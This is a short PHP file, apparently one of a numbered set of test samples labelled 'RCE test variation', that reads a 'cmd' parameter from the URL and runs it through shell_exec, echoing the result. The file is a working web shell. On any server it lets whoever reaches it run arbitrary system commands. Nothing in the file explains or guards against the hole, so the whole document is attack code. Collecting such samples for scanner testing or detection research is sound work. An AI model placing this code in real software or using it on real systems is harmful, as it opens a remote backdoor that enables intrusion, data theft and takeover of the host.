<?php
// RCE test variation #276
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>